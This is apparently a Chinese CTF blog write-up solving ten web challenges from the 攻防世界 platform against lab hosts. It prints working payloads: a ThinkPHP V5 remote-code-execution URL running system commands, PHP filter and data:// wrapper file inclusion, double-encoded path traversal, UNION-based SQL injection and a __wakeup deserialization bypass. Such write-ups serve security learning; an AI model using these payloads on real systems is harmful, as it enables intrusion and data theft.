# 攻防世界web高手篇（001-010）

## 0x00 baby_web

题目描述：想想初始页面是哪个

在url后面输入index.php，但跳转到1.php。打开网络，发现访问到过。<figure class="wp-block-image size-full">

<img loading="lazy" width="1225" height="201" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-82.png" alt="" class="wp-image-2604" /> </figure> 

然后在响应头找到<figure class="wp-block-image size-full">

<img loading="lazy" width="224" height="23" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-83.png" alt="" class="wp-image-2605" /> </figure> 

## 0x01 Training-WWW-Robots

<figure class="wp-block-image size-full">

<img loading="lazy" width="998" height="136" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-86.png" alt="" class="wp-image-2609" /></figure> 

## 0x02 php_rce

<figure class="wp-block-image size-full">

<img loading="lazy" width="776" height="398" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-87.png" alt="" class="wp-image-2611" /> </figure> 

搜一下ThinkPHP V5的漏洞，参考：<a rel="noreferrer noopener" href="https://www.cnblogs.com/backlion/p/10106676.html" target="_blank" rel="nofollow" >https://www.cnblogs.com/backlion/p/10106676.html</a>

直接使用payload,`http://111.200.241.244:62801/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami`，能够RCE。<figure class="wp-block-image size-full">

<img loading="lazy" width="238" height="52" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-88.png" alt="" class="wp-image-2612" /> </figure> 

`http://111.200.241.244:62801/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls /`<figure class="wp-block-image size-full">

<img loading="lazy" width="889" height="39" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-89.png" alt="" class="wp-image-2615" /> </figure> 

`http://111.200.241.244:62801/?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=cat /flag`<figure class="wp-block-image size-full">

<img loading="lazy" width="192" height="37" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-90.png" alt="" class="wp-image-2616" /> </figure> 

## 0x03 Web\_php\_include

<figure class="wp-block-image size-full">

<img loading="lazy" width="441" height="174" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-91.png" alt="" class="wp-image-2618" /> </figure> 

阅读代码发现`php://`会被过滤，这里采用`PHP://`大写绕过。<figure class="wp-block-image size-full">

<img loading="lazy" width="1343" height="616" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-92.png" alt="" class="wp-image-2619" /> </figure> 

修改POST内容为`<?php system("ls");?>`<figure class="wp-block-image size-full">

<img loading="lazy" width="194" height="56" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-93.png" alt="" class="wp-image-2621" /> </figure> 

`http://111.200.241.244:64165/?page=PHP://filter/read=convert.base64-encode/resource=fl4gisisish3r3.php`

得到`PD9waHAKJGZsYWc9ImN0Zns4NzZhNWZjYS05NmM2LTRjYmQtOTA3NS00NmYwYzg5NDc1ZDJ9IjsKPz4K`，decode后得到flag。

解法2：利用data://伪协议

使用方法:`data://text/plain;base64,xxxx(base64编码后的数据)`

将 `<?php system("cat fl4gisisish3r3.php");?>` base64加密，得到`PD9waHAgc3lzdGVtKCJjYXQgZmw0Z2lzaXNpc2gzcjMucGhwIik7Pz4=`

执行后，查看源代码<figure class="wp-block-image size-full">

<img loading="lazy" width="529" height="62" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-94.png" alt="" class="wp-image-2623" /> </figure> 

## 0x04 ics-06

题目描述：云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。<figure class="wp-block-image size-full">

<img loading="lazy" width="418" height="221" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-95.png" alt="" class="wp-image-2626" /> </figure> 

id只能输入数字，输入其它的参数也会变成数字，这里使用burpsuite的intruder来爆破一下。<figure class="wp-block-image size-full">

<img loading="lazy" width="678" height="136" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-96.png" alt="" class="wp-image-2627" /> </figure> 

访问url<figure class="wp-block-image size-full">

<img loading="lazy" width="739" height="410" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-97.png" alt="" class="wp-image-2628" /> </figure> 

## 0x05 warmup

阅读源代码，发现注释`<!--source.php-->`，进入url/source.php，页面显示

```php
<?php

    highlight_file(__FILE__); //打印代码
    
    class emmm //定义emmm类
    
    {
    
        public static function checkFile(&$page) //将传入参数赋值给$page
    
        {
    
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"]; //申明白名单
    
            if (! isset($page) || !is_string($page)) { //若$page变量不存在或存在非法字符
    
                echo "you can't see it";
    
                return false; //返回false
    
            }

 


            if (in_array($page, $whitelist)) { $page在数组中
    
                return true; //返回true
    
            }

 


            $_page = mb_substr(
    
                $page,
    
                0,
    
                mb_strpos($page . '?', '?')
    
            );
    
            if (in_array($_page, $whitelist)) {
    
                return true;
    
            } //截取$page中？前部分，若没有截取整个$page

 


            $_page = urldecode($page); //url解码
    
            $_page = mb_substr(
    
                $_page,
    
                0,
    
                mb_strpos($_page . '?', '?')
    
            );
    
            if (in_array($_page, $whitelist)) {
    
                return true;
    
            }
    
            echo "you can't see it";
    
            return false;
    
        }
    
    }

//--------------------------------------------------------------------------------------------------------------

    if (! empty($_REQUEST['file'])
    
        && is_string($_REQUEST['file'])
    
        && emmm::checkFile($_REQUEST['file'])
    
    ) {
    
        include $_REQUEST['file'];
    
        exit;
    
    } else {
    
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";

}  ?> 
```

`mb_substr($str, $start, $length )` 函数根据 `start` 和 `length` 参数返回 `str` 中指定的部分。

`mb_strpos ($haystack ,$needle )`函数返回 needle 在别一个字符串中首次出现的位置。

hint.php存在一条提示<figure class="wp-block-image size-full">

<img loading="lazy" width="406" height="47" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-98.png" alt="" class="wp-image-2631" /> </figure> 

`?`两次url编码后为`%253f`，由于不知道ffffllllaaaagggg文件的具体位置，依次增加`../`测试。最后，构造`http://111.200.241.244:60376/?file=source.php%253f../../../../../ffffllllaaaagggg`<figure class="wp-block-image size-full">

<img loading="lazy" width="379" height="32" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-99.png" alt="" class="wp-image-2636" /> </figure> 

## 0x06 NewsCenter

题目描述：如题目环境报错，稍等片刻刷新即可。（等待了1个小时多。。。。）<figure class="wp-block-image size-full">

<img loading="lazy" width="1499" height="605" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-110.png" alt="" class="wp-image-2657" /> </figure> 

输入`1' order by 3#`，得知有三列。构造`1' union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=database())#`<figure class="wp-block-image size-full">

<img loading="lazy" width="200" height="146" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-111.png" alt="" class="wp-image-2659" /> </figure> 

爆破出表后，爆破字段`1' union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name='secret_table')#`<figure class="wp-block-image size-full is-resized">

<img loading="lazy" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-112.png" alt="" class="wp-image-2660" width="135" height="148" /> </figure> 

最后，构造`1' union select 1,2,(select group_concat(fl4g) from secret_table)#`



## 0x07 NaNNaNNaNNaN-Batman

解压压缩包<figure class="wp-block-image size-full">

<img loading="lazy" width="912" height="234" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-104.png" alt="" class="wp-image-2642" /> </figure> 

目测是html文件，修改下后缀名。<figure class="wp-block-image size-full">

<img loading="lazy" width="253" height="53" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-103.png" alt="" class="wp-image-2641" /> </figure> 

把最后的eval修改成alert，阅读源码。

```php
function $(){
   var e=document.getElementById("c").value;
   if(e.length==16)
   if(e.match(/^be0f23/)!=null)
   if(e.match(/233ac/)!=null)
   if(e.match(/e98aa$/)!=null)
   if(e.match(/c7be9/)!=null){
      var t=["fl","s_a","i","e}"];
      var n=["a","_h0l","n"];
      var r=["g{","e","_0"];
      var i=["it'","_","n"];
      var s=[t,n,r,i];
      for(var o=0;o<13;++o){
         document.write(s[o%4][0]);
         s[o%4].splice(0,1)}}}
document.write('<input id="c"><button onclick=$()>Ok</button>');delete _
```


match的值应该是`be0f233ac7be98aa`，输入得到`flag{it's_a_h0le_in_0ne}`。也可以直接在控制台运行js代码。

## 0x08 PHP2

<figure class="wp-block-image size-full">

<img loading="lazy" width="897" height="113" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-105.png" alt="" class="wp-image-2648" /> </figure> 

.phps：phps文件就是php的源代码文件。通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用phps文件代替。

我们访问阅读一下源代码

```php
<?php
if("admin"===$_GET[id]) {
  echo("<p>not allowed!</p>");
  exit();
}

$_GET[id] = urldecode($_GET[id]);
if($_GET[id] == "admin")
{
  echo "<p>Access granted!</p>";
  echo "<p>Key: xxxxxxx </p>";
}
?>
```

使用url二次编码绕过<figure class="wp-block-image size-full">

<img loading="lazy" width="960" height="570" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-107.png" alt="" class="wp-image-2651" /></figure> 

## 0x09 unserialize3

<figure class="wp-block-image size-full">

<img loading="lazy" width="290" height="162" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-108.png" alt="" class="wp-image-2653" /> </figure> 

__wakeup() 经常用在反序列化操作中，例如重新建立数据库连接，或执行其它初始化操作。实例化xctf类并对其使用序列化。

```php
<?php
class xctf{                      //定义一个名为xctf的类
public $flag = '111';            //定义一个公有的类属性$flag，值为111
public function __wakeup(){      //定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本
exit('bad requests');
}
}
$a = new xctf();          //使用new运算符来实例化该类（xctf）的对象为a
echo(serialize($a));      //输出被序列化的对象（a）
?>
```


运行结果`O:4:"xctf":1:{s:4:"flag";s:3:"111";}`

序列化返回的字符串格式：

<pre class="wp-block-code"><code>O:&lt;length&gt;:"&lt;class name&gt;":&lt;n&gt;:{&lt;field name 1&gt;&lt;field value 1&gt;...&lt;field name n&gt;&lt;field value n&gt;} </code></pre>

利用\_\_wakeup()函数漏洞原理：当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过\_\_wakeup的执行。修改属性值<n>。构造`http://111.200.241.244:65392/?code=O:4:"xctf":2:{s:4:"flag";s:3:"111";}`<figure class="wp-block-image size-full">

<img loading="lazy" width="647" height="35" src="https://cdn.jsdelivr.net/gh/Hannibal0x/img/2021/08/图片-109.png" alt="" class="wp-image-2656" /> </figure>
